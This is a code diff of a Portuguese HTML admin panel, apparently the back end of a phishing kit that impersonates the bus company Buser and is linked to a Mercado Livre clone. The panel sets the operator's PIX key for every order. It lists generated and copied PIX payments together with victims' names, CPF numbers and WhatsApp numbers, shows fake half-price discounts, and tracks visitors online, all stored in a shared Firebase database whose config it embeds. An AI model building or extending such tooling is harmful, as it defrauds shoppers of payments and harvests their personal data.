@@ -3,8 +3,10 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Painel Admin | Buser</title>
+<title>Painel Admin Buser | Firebase</title>
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap">
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 <style>
   :root{--brand:#f11075;--green:#40b552;--grey-dark:#454545;--grey-med:#757575;--grey-light:#e0e0e0}
   *{box-sizing:border-box}
@@ -14,24 +16,20 @@
   .header p{margin:6px 0 0;font-size:13px;opacity:.9}
   .container{max-width:1100px;margin:0 auto;padding:24px}
   .card{background:#fff;border-radius:12px;padding:24px;margin-bottom:24px;box-shadow:0 2px 8px rgba(0,0,0,.06)}
-  .card h2{margin:0 0 8px;font-size:18px;color:var(--brand);display:flex;align-items:center;gap:8px}
-  .card .sub{font-size:13px;color:var(--grey-med);margin:0 0 16px}
+  .card h2{margin:0 0 8px;font-size:18px;color:var(--brand)}
   label{display:block;font-size:12px;font-weight:600;margin-bottom:4px;margin-top:12px}
   input{width:100%;padding:11px 14px;border:1px solid #ddd;border-radius:8px;font-family:'Poppins';font-size:14px}
   input:focus{outline:none;border-color:var(--brand)}
-  button{padding:11px 20px;border:none;border-radius:8px;font-weight:600;cursor:pointer;font-family:'Poppins';font-size:14px;transition:.2s}
+  button{padding:11px 20px;border:none;border-radius:8px;font-weight:600;cursor:pointer;font-family:'Poppins';font-size:14px}
   .btn-primary{background:var(--brand);color:#fff}
-  .btn-primary:hover{background:#c70d5e}
   .btn-secondary{background:#fff;color:var(--brand);border:2px solid var(--brand)}
-  .btn-secondary:hover{background:#fff7fa}
   .btn-danger{background:#fff;color:#d81b60;border:2px solid #d81b60}
-  .btn-danger:hover{background:#fff0f4}
   .btn-small{padding:7px 14px;font-size:12px}
   .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
   @media(max-width:768px){.stats{grid-template-columns:repeat(2,1fr)}}
   .stat{border-radius:12px;padding:18px;background:linear-gradient(135deg,#fff7fa,#fff);border:1px solid var(--grey-light)}
   .stat .value{font-size:26px;font-weight:700;color:var(--brand);line-height:1.1}
-  .stat .label{font-size:10px;color:var(--grey-med);text-transform:uppercase;letter-spacing:.5px;margin-top:6px}
+  .stat .label{font-size:10px;color:var(--grey-med);text-transform:uppercase;margin-top:6px}
   .log-item{border:1px solid var(--grey-light);border-radius:10px;padding:16px;margin-bottom:12px;background:#fafafa}
   .log-item.generated{border-left:4px solid var(--green)}
   .log-item.copied{border-left:4px solid #ffa000}
@@ -45,37 +43,35 @@
   .log-meta strong{color:var(--grey-dark)}
   .pix-code-box{background:#fff;border:1px solid var(--grey-light);border-radius:6px;padding:10px;font-family:monospace;font-size:11px;word-break:break-all;max-height:80px;overflow-y:auto;margin-top:10px}
   .empty{text-align:center;padding:50px 20px;color:var(--grey-med)}
-  .empty .icon{font-size:48px;display:block;margin-bottom:12px}
-  .toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(100px);background:#2e7d32;color:#fff;padding:14px 28px;border-radius:8px;font-size:14px;font-weight:500;z-index:9999;opacity:0;transition:.3s;pointer-events:none;box-shadow:0 8px 24px rgba(0,0,0,.3)}
+  .toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(100px);background:#2e7d32;color:#fff;padding:14px 28px;border-radius:8px;font-weight:500;z-index:9999;opacity:0;transition:.3s;pointer-events:none}
   .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
   .warning{background:#fff3cd;color:#7a5c00;padding:14px 18px;border-radius:8px;font-size:13px;margin-bottom:20px;border-left:4px solid #ffa000}
   .toolbar{display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap}
   .toolbar .spacer{flex:1}
-  .links{display:flex;gap:12px;margin-top:16px;flex-wrap:wrap}
-  .links a{color:#fff;font-size:13px;text-decoration:underline}
+  .online-badge{display:inline-block;width:8px;height:8px;border-radius:50%;background:#40b552;margin-right:6px;animation:pulse 1.5s infinite}
+  .offline-badge{display:inline-block;width:8px;height:8px;border-radius:50%;background:#ccc;margin-right:6px}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
 </style>
 </head>
 <body>
 
 <div class="header">
   <div class="container" style="padding:0">
-    <h1>⚙️ Painel do Recebedor PIX</h1>
-    <p>Configure a chave · Veja PIX gerados e copiados em tempo real</p>
-    <div class="links">
-      <a href="index.html" target="_blank">↗ Abrir site em nova aba</a>
-    </div>
+    <h1>⚙️ Painel Admin Buser — Firebase</h1>
+    <p>PIX e dados sincronizados em tempo real · Firebase <strong>projeto-link-ddbf0</strong></p>
+    <p style="margin-top:8px;font-size:12px;">🔗 <a href="index.html" target="_blank" style="color:#fff;text-decoration:underline;">Abrir site em nova aba</a></p>
   </div>
 </div>
 
 <div class="container">
 
-  <div class="warning" id="warning-origin" style="display:none">
-    ⚠️ <strong>Modo arquivo local (file://).</strong> Os dados só aparecem se o site e este painel rodarem no <strong>mesmo domínio/servidor</strong>. Rode <code>python -m http.server</code> na pasta ou hospede os dois no mesmo host.
+  <div class="warning">
+    ⚠️ <strong>Atenção:</strong> esse Firebase é compartilhado com o projeto do Mercado Livre. Os dados do Buser ficam isolados nos paths <code>buser_*</code> — não se misturam com os pedidos do ML.
   </div>
 
   <div class="card">
     <h2>🔑 Configuração da chave PIX</h2>
-    <p class="sub">Essa chave será usada em <strong>todos</strong> os pedidos gerados no site.</p>
+    <p style="font-size:13px;color:var(--grey-med);margin:0 0 16px;">Salva no Firebase em <code>buser_pix_cfg</code>. Vale para todos os dispositivos.</p>
     <label>Chave PIX *</label>
     <input id="cfg-key" type="text" placeholder="CPF, CNPJ, e-mail, telefone ou chave aleatória">
     <label>Nome do recebedor</label>
@@ -83,23 +79,23 @@
     <label>Cidade</label>
     <input id="cfg-city" type="text" placeholder="Ex: SAO PAULO" maxlength="15">
     <div style="display:flex;gap:8px;margin-top:20px;flex-wrap:wrap">
-      <button class="btn-primary" onclick="salvarConfig()">💾 Salvar configuração</button>
+      <button class="btn-primary" onclick="salvarConfig()">💾 Salvar no Firebase</button>
       <button class="btn-secondary" onclick="carregarConfig()">🔄 Recarregar</button>
     </div>
   </div>
 
   <div class="card">
-    <h2>📊 Resumo</h2>
+    <h2>📊 Resumo (tempo real)</h2>
     <div class="stats">
       <div class="stat"><div class="value" id="stat-gen">0</div><div class="label">PIX gerados</div></div>
       <div class="stat"><div class="value" id="stat-cop">0</div><div class="label">PIX copiados</div></div>
       <div class="stat"><div class="value" id="stat-total">R$ 0</div><div class="label">Valor arrecadado</div></div>
-      <div class="stat"><div class="value" id="stat-avg">R$ 0</div><div class="label">Ticket médio</div></div>
+      <div class="stat"><div class="value" id="stat-online">0</div><div class="label">Usuários online</div></div>
     </div>
   </div>
 
   <div class="card">
-    <h2>📋 Histórico de PIX</h2>
+    <h2>📋 PIX gerados (todos os clientes)</h2>
     <div class="toolbar">
       <button class="btn-secondary btn-small" onclick="filtrarLog('all')" id="filtro-all">Todos</button>
       <button class="btn-secondary btn-small" onclick="filtrarLog('generated')" id="filtro-generated">🟢 Gerados</button>
@@ -109,8 +105,13 @@
       <button class="btn-danger btn-small" onclick="limparLog()">🗑️ Limpar</button>
     </div>
     <div id="log-container">
-      <div class="empty"><span class="icon">📭</span>Nenhum PIX registrado ainda.<br><span style="font-size:12px">Gere um PIX no site para ver aparecer aqui.</span></div>
+      <div class="empty">📭 Carregando dados do Firebase...</div>
     </div>
+  </div>
+
+  <div class="card">
+    <h2>👥 Visitantes online</h2>
+    <div id="visitas-container">Carregando...</div>
   </div>
 
 </div>
@@ -118,10 +119,24 @@
 <div id="toast" class="toast"></div>
 
 <script>
-  if (location.protocol === 'file:') document.getElementById('warning-origin').style.display = 'block';
+  // ============================================================
+  // FIREBASE — mesmo do index.html
+  // ============================================================
+  const firebaseConfig = {
+    apiKey: "AIzaSyCmoxq5NMQUj1hqyWhjaJz4Uw4grhsFFhA",
+    authDomain: "projeto-link-ddbf0.firebaseapp.com",
+    databaseURL: "https://projeto-link-ddbf0-default-rtdb.firebaseio.com",
+    projectId: "projeto-link-ddbf0",
+    storageBucket: "projeto-link-ddbf0.firebasestorage.app",
+    messagingSenderId: "560317126646",
+    appId: "1:560317126646:web:be9cad9c9ed350940399d7"
+  };
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
 
   let filtroAtual = 'all';
-  let ultimoLogStr = '';
+  let todosPedidos = {};
+  let todasVisitas = {};
 
   function toast(msg, ok = true) {
     const t = document.getElementById('toast');
@@ -132,48 +147,115 @@
     t._timeout = setTimeout(() => t.classList.remove('show'), 2500);
   }
 
-  // ============ CONFIG ============
-  function carregarConfig() {
-    const cfg = JSON.parse(localStorage.getItem('buser_pix_cfg') || '{}');
-    document.getElementById('cfg-key').value = cfg.key || '';
-    document.getElementById('cfg-name').value = cfg.name || '';
-    document.getElementById('cfg-city').value = cfg.city || '';
+  // ============================================================
+  // CONFIG PIX
+  // ============================================================
+  async function carregarConfig() {
+    try {
+      const snap = await db.ref('buser_pix_cfg').once('value');
+      const cfg = snap.val() || {};
+      document.getElementById('cfg-key').value = cfg.key || '';
+      document.getElementById('cfg-name').value = cfg.name || '';
+      document.getElementById('cfg-city').value = cfg.city || '';
+    } catch (e) { toast('Erro ao carregar config', false); }
   }
 
-  function salvarConfig() {
+  async function salvarConfig() {
     const key = document.getElementById('cfg-key').value.trim();
     const name = document.getElementById('cfg-name').value.trim();
     const city = document.getElementById('cfg-city').value.trim();
     if (!key) { toast('⚠️ Informe a chave PIX.', false); return; }
-    localStorage.setItem('buser_pix_cfg', JSON.stringify({ key, name, city }));
-    toast('✅ Configuração salva!');
-    window.dispatchEvent(new StorageEvent('storage', { key: 'buser_pix_cfg' }));
+    try {
+      await db.ref('buser_pix_cfg').set({ key, name, city, atualizadoEm: Date.now() });
+      toast('✅ Chave salva no Firebase!');
+    } catch (e) {
+      toast('❌ Erro ao salvar: ' + e.message, false);
+    }
   }
 
-  // ============ LOG ============
-  function getLog() {
-    try { return JSON.parse(localStorage.getItem('buser_pix_log') || '[]'); }
-    catch { return []; }
-  }
-  function setLog(l) { localStorage.setItem('buser_pix_log', JSON.stringify(l)); }
-
-  function limparLog() {
-    if (!confirm('Apagar TODO o histórico de PIX?\nEssa ação não pode ser desfeita.')) return;
-    setLog([]);
+  // ============================================================
+  // LISTENER em tempo real de pedidos
+  // ============================================================
+  db.ref('buser_pedidos').on('value', snap => {
+    todosPedidos = snap.val() || {};
     renderLog();
-    toast('🗑️ Histórico apagado.');
-  }
+  }, err => {
+    console.error(err);
+    document.getElementById('log-container').innerHTML = `<div class="empty" style="color:#d81b60;">❌ Erro ao conectar Firebase: ${err.message}<br><small>Verifique se as regras permitem leitura.</small></div>`;
+  });
 
-  function exportarLog() {
-    const log = getLog();
-    const blob = new Blob([JSON.stringify(log, null, 2)], { type: 'application/json' });
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = `buser_pix_log_${new Date().toISOString().slice(0,10)}.json`;
-    a.click();
-    URL.revokeObjectURL(url);
-    toast('⬇️ Exportado!');
+  // ============================================================
+  // LISTENER de visitas online
+  // ============================================================
+  db.ref('buser_visitas').on('value', snap => {
+    todasVisitas = snap.val() || {};
+    renderVisitas();
+  });
+
+  // ============================================================
+  // RENDER — histórico de PIX
+  // ============================================================
+  function renderLog() {
+    const container = document.getElementById('log-container');
+
+    // Extrai todos os PIX de todos os clientes
+    const listaPix = [];
+    Object.keys(todosPedidos).forEach(clienteId => {
+      const pedido = todosPedidos[clienteId];
+      if (pedido && pedido.pix) {
+        Object.keys(pedido.pix).forEach(txid => {
+          listaPix.push({ clienteId, ...pedido.pix[txid] });
+        });
+      }
+    });
+    listaPix.sort((a, b) => (b.geradoEm || 0) - (a.geradoEm || 0));
+
+    // Filtro
+    let filtrados = listaPix;
+    if (filtroAtual === 'copied') filtrados = listaPix.filter(p => p.copiado);
+    else if (filtroAtual === 'generated') filtrados = listaPix;
+
+    // Stats
+    const total = listaPix.reduce((s, p) => s + (p.amount || 0), 0);
+    const copiados = listaPix.filter(p => p.copiado).length;
+    const online = Object.values(todasVisitas).filter(v => v.online).length;
+    document.getElementById('stat-gen').textContent = listaPix.length;
+    document.getElementById('stat-cop').textContent = copiados;
+    document.getElementById('stat-total').textContent = 'R$ ' + total.toFixed(2).replace('.', ',');
+    document.getElementById('stat-online').textContent = online;
+
+    if (filtrados.length === 0) {
+      container.innerHTML = `<div class="empty">📭 Nenhum PIX ${filtroAtual === 'copied' ? 'copiado' : ''} ainda.</div>`;
+      return;
+    }
+
+    container.innerHTML = filtrados.map(p => {
+      const data = new Date(p.geradoEm || 0).toLocaleString('pt-BR');
+      const orig = p.originalAmount || (p.amount * 2);
+      const pass = (p.passengers || []).map(ps =>
+        `<li>${ps.nome} — CPF ${ps.cpf} — 📱 ${ps.whatsapp} ${ps.poltrona ? `— 🪑 Poltrona ${ps.poltrona}` : ''}</li>`
+      ).join('');
+
+      return `
+        <div class="log-item ${p.copiado ? 'copied' : 'generated'}">
+          <div class="log-header">
+            <div>
+              <span class="log-badge ${p.copiado ? 'badge-copied' : 'badge-generated'}">
+                ${p.copiado ? '🟡 PIX COPIADO' : '🟢 PIX GERADO'}
+              </span>
+              <span class="log-meta" style="margin-left:8px;display:inline">${data}</span>
+            </div>
+            <div class="log-amount"><span class="strike">R$ ${orig.toFixed(2).replace('.', ',')}</span>R$ ${(p.amount||0).toFixed(2).replace('.', ',')}</div>
+          </div>
+          <div class="log-meta"><strong>TXID:</strong> ${p.txid} · <strong>Empresa:</strong> ${p.empresa || '-'} · <strong>Poltrona(s):</strong> ${p.poltrona || '-'}</div>
+          <div class="log-meta"><strong>Rota:</strong> ${p.route || '-'}</div>
+          <div class="log-meta"><strong>Chave:</strong> ${p.key} · <strong>Recebedor:</strong> ${p.receiverName || '-'}</div>
+          <div class="log-meta"><strong>Cliente ID:</strong> <code style="font-size:10px;">${p.clienteId}</code> · <strong>Status:</strong> ${p.status || 'pending'}</div>
+          ${pass ? `<div class="log-meta"><strong>Passageiros:</strong><ul style="margin:4px 0 0 18px;padding:0">${pass}</ul></div>` : ''}
+          ${p.payload ? `<div class="pix-code-box">${p.payload}</div>
+            <button class="btn-secondary btn-small" style="margin-top:8px" onclick="copiarPayload('${p.clienteId}','${p.txid}')">📋 Copiar payload</button>` : ''}
+        </div>`;
+    }).join('');
   }
 
   function filtrarLog(f) {
@@ -186,91 +268,66 @@
     renderLog();
   }
 
-  function copiarPayload(txid) {
-    const entry = getLog().find(l => l.txid === txid && l.type === 'generated');
-    if (!entry || !entry.payload) { toast('❌ PIX não encontrado', false); return; }
-    navigator.clipboard.writeText(entry.payload).then(() => {
-      toast('✅ Código PIX copiado!');
-      const log = getLog();
-      log.unshift({ type: 'copied', txid, timestamp: Date.now(), by: 'admin' });
-      setLog(log);
-      renderLog();
-    }).catch(() => toast('❌ Erro ao copiar', false));
+  function copiarPayload(clienteId, txid) {
+    const entry = todosPedidos[clienteId]?.pix?.[txid];
+    if (!entry || !entry.payload) { toast('❌ Não encontrado', false); return; }
+    navigator.clipboard.writeText(entry.payload).then(() => toast('✅ Copiado!'));
   }
 
-  function renderLog() {
-    const allLog = getLog();
-    const log = filtroAtual === 'all' ? allLog : allLog.filter(l => l.type === filtroAtual);
-    const container = document.getElementById('log-container');
-
-    const gerados = allLog.filter(l => l.type === 'generated');
-    const copiados = allLog.filter(l => l.type === 'copied');
-    const total = gerados.reduce((s, l) => s + (l.amount || 0), 0);
-    document.getElementById('stat-gen').textContent = gerados.length;
-    document.getElementById('stat-cop').textContent = copiados.length;
-    document.getElementById('stat-total').textContent = 'R$ ' + total.toFixed(2).replace('.', ',');
-    document.getElementById('stat-avg').textContent = gerados.length
-      ? 'R$ ' + (total / gerados.length).toFixed(2).replace('.', ',') : 'R$ 0';
-
-    if (log.length === 0) {
-      container.innerHTML = `<div class="empty"><span class="icon">📭</span>Nenhum registro ${filtroAtual === 'all' ? '' : filtroAtual === 'generated' ? 'gerado' : 'copiado'} ainda.</div>`;
+  // ============================================================
+  // RENDER — visitantes
+  // ============================================================
+  function renderVisitas() {
+    const container = document.getElementById('visitas-container');
+    const visitas = Object.entries(todasVisitas).map(([id, v]) => ({ id, ...v }));
+    if (visitas.length === 0) {
+      container.innerHTML = '<div class="empty">Nenhum visitante ainda.</div>';
       return;
     }
-
-    container.innerHTML = log.map(entry => {
-      const data = new Date(entry.timestamp).toLocaleString('pt-BR');
-      if (entry.type === 'generated') {
-        const pass = (entry.passengers || []).map(p =>
-          `<li>${p.nome} — CPF ${p.cpf} — 📱 ${p.whatsapp}</li>`).join('');
-        const orig = entry.originalAmount || (entry.amount * 2);
-        return `
-          <div class="log-item generated">
-            <div class="log-header">
-              <div>
-                <span class="log-badge badge-generated">🟢 PIX GERADO</span>
-                <span class="log-meta" style="margin-left:8px;display:inline">${data}</span>
-              </div>
-              <div class="log-amount">
-                <span class="strike">R$ ${orig.toFixed(2).replace('.', ',')}</span>
-                R$ ${(entry.amount || 0).toFixed(2).replace('.', ',')}
-              </div>
-            </div>
-            <div class="log-meta"><strong>TXID:</strong> ${entry.txid} · <strong>Empresa:</strong> ${entry.empresa || '-'} · <strong>Poltrona:</strong> ${entry.poltrona || '-'} · <strong>Rota:</strong> ${entry.route || '-'}</div>
-            <div class="log-meta"><strong>Chave:</strong> ${entry.key} · <strong>Recebedor:</strong> ${entry.receiverName || '-'}</div>
-            ${pass ? `<div class="log-meta"><strong>Passageiros:</strong><ul style="margin:4px 0 0 18px;padding:0">${pass}</ul></div>` : ''}
-            ${entry.payload ? `<div class="pix-code-box">${entry.payload}</div>
-              <button class="btn-secondary btn-small" style="margin-top:8px" onclick="copiarPayload('${entry.txid}')">📋 Copiar payload PIX</button>` : ''}
-          </div>`;
-      }
+    visitas.sort((a, b) => (b.ultimaAtividade || 0) - (a.ultimaAtividade || 0));
+    container.innerHTML = visitas.map(v => {
+      const tempo = Math.round((Date.now() - (v.ultimaAtividade || 0)) / 1000);
+      const tempoStr = tempo < 60 ? `${tempo}s atrás` : tempo < 3600 ? `${Math.floor(tempo/60)}min atrás` : `${Math.floor(tempo/3600)}h atrás`;
       return `
-        <div class="log-item copied">
-          <div class="log-header">
-            <div>
-              <span class="log-badge badge-copied">🟡 PIX COPIADO</span>
-              <span class="log-meta" style="margin-left:8px;display:inline">${data}</span>
-            </div>
-            <div style="font-size:12px;color:var(--grey-med)">${entry.by === 'admin' ? '👤 Admin' : '👥 Cliente'}</div>
-          </div>
-          <div class="log-meta"><strong>TXID:</strong> ${entry.txid}</div>
+        <div style="display:flex;align-items:center;gap:8px;padding:10px 0;border-bottom:1px solid #eee;font-size:13px;">
+          <span class="${v.online ? 'online-badge' : 'offline-badge'}"></span>
+          <code style="font-size:11px;color:#666;">${v.id}</code>
+          <span style="color:#999;font-size:11px;margin-left:auto;">${v.online ? '🟢 Online' : '⚪ Offline'} · ${tempoStr}</span>
         </div>`;
     }).join('');
   }
 
-  // ============ SINCRONIZAÇÃO ============
-  window.addEventListener('storage', e => {
-    if (e.key === 'buser_pix_log') renderLog();
-    if (e.key === 'buser_pix_cfg') carregarConfig();
-  });
+  // ============================================================
+  // EXPORTAR / LIMPAR
+  // ============================================================
+  function exportarLog() {
+    const blob = new Blob([JSON.stringify(todosPedidos, null, 2)], { type: 'application/json' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `buser_backup_${new Date().toISOString().slice(0,10)}.json`;
+    a.click();
+    URL.revokeObjectURL(url);
+    toast('⬇️ Exportado!');
+  }
 
-  setInterval(() => {
-    const cur = localStorage.getItem('buser_pix_log');
-    if (cur !== ultimoLogStr) { ultimoLogStr = cur; renderLog(); }
-  }, 1500);
+  async function limparLog() {
+    if (!confirm('Apagar TODOS os pedidos e PIX do Buser no Firebase?\n\nEssa ação NÃO pode ser desfeita.')) return;
+    try {
+      await db.ref('buser_pedidos').remove();
+      await db.ref('buser_alertas').remove();
+      toast('🗑️ Pedidos e alertas apagados.');
+    } catch (e) {
+      toast('❌ Erro: ' + e.message, false);
+    }
+  }
 
-  // Init
+  // ============================================================
+  // INIT
+  // ============================================================
   carregarConfig();
-  renderLog();
   filtrarLog('all');
+  setInterval(renderVisitas, 5000); // atualiza tempo "X segundos atrás"
 </script>
 
 </body>
